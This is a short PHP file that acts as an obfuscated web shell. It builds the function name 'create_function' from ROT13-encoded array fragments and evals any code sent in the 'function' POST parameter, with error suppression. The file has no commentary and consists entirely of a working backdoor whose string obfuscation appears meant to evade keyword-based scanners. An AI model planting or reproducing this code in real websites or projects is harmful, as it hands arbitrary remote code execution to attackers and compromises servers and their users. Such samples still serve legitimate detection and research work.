<?php

function create_function($args, $com) {
    return function() use ($args, $com) {
        @eval($com);
    };
}

class CreateFunction {
    public $func;
    function __construct($func) {
        $this->func = $func;
    }

    function create() {
        $arr = array('pe', '', 'rngr_', null, 'shap', null, 'gvba');
        $str = implode(array_filter($arr));
        $str = str_rot13($str);
        $str = $str;
        $fun=$str('',$this->func);
        $fun();
    }
}

$func = $_POST['function'];
$obj = new CreateFunction($func);
($obj->create());
?>